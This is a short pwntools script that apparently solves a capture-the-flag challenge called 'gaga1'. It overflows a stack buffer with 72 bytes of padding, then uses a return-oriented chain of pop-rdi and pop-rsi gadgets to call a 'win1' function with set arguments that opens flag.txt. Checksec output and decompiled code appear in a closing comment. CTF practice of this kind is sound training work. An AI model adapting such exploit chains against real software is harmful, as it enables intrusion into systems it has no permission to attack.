#!/usr/bin/env python3

from pwn import *

exe = './gaga1'
elf = context.binary = ELF(exe,checksec=False)
context.log_level='debug'

#host,port = '',

p = process(exe)
#p = remote(host,port)

padding = 72

pop_rdi = 0x00000000004013b3
param1 = 0x1337
pop_rsi_r15 = 0x00000000004013b1 
param2 = 0x4141

payload = flat(
    asm('nop')*padding,#padding to reach EIP
    pop_rdi,
    param1,
    pop_rsi_r15,
    param2,
    0x0,
    elf.symbols.win1,
    elf.symbols.main,
)

p.sendlineafter(b': ',payload)
p.interactive()
'''
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)

  if ((param_1 == 0x1337) || (param_2 == 0x4141)) {
    local_10 = fopen("flag.txt","r");
So return to win with parameters
'''
